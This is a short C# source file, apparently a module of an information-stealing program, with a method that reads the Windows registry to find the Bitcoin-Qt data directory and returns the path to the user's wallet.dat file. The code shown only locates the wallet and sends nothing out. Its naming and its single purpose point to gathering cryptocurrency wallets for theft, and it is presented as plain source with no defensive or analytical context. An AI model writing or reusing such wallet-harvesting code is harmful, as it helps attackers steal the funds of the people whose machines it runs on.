using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace Soph.BTC
{
    class Crypto
    {
        public static string get_bitcoin()
        {
            string result;
            try
            {
                using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt"))
                {
                    result = registryKey.GetValue("strDataDir").ToString() + "wallet.dat";
                }
            }
            catch
            {
                result = "";
            }
            return result;
        }
    }
}
